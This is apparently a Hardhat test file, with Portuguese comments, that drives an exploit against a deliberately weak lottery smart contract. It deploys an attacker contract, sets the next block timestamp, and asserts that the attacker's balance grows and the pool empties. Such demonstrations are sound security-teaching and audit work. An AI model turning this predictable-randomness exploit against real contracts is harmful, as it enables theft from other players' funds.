const { expect } = require("chai");
const { ethers, network } = require("hardhat");

describe("Lottery Randomness Vulnerability", function () {
  let lottery, attack;
  let owner, attacker, user1, user2;

  beforeEach(async () => {
    [owner, attacker, user1, user2] = await ethers.getSigners();

    const Lottery = await ethers.getContractFactory("Lottery");
    lottery = await Lottery.deploy();
    await lottery.waitForDeployment?.(); // compatibilidade com ethers v6 (se aplicável)

    // Usuários legítimos entram
    await lottery.connect(user1).enter({
      value: ethers.parseEther("0.1"),
    });

    await lottery.connect(user2).enter({
      value: ethers.parseEther("0.1"),
    });

    // Deploy do contrato de ataque
    const Attack = await ethers.getContractFactory("LotteryAttack");
    attack = await Attack.connect(attacker).deploy(lottery.target);
    await attack.waitForDeployment?.();
  });

  it("Atacante ganha explorando randomness previsível", async () => {
    const balanceBefore = await ethers.provider.getBalance(attacker.address);

    // --- CORREÇÃO: definir timestamp maior que o último bloco ---
    const latestBlock = await ethers.provider.getBlock("latest");
    const nextTimestamp = latestBlock.timestamp + 60; // avança 60s
    await network.provider.send("evm_setNextBlockTimestamp", [nextTimestamp]);
    await network.provider.send("evm_mine"); // mina o bloco com o timestamp definido

    // Alternativa: aumentar tempo relativo (descomente se preferir)
    // await network.provider.send("evm_increaseTime", [60]);
    // await network.provider.send("evm_mine");

    await attack.connect(attacker).attack({
      value: ethers.parseEther("0.1"),
    });

    // mina caso o ataque faça alguma operação que dependa de novo bloco
    await network.provider.send("evm_mine");

    const balanceAfter = await ethers.provider.getBalance(attacker.address);

    expect(balanceAfter).to.be.gt(balanceBefore);
    expect(await lottery.getPlayers()).to.have.length(0);
  });
});
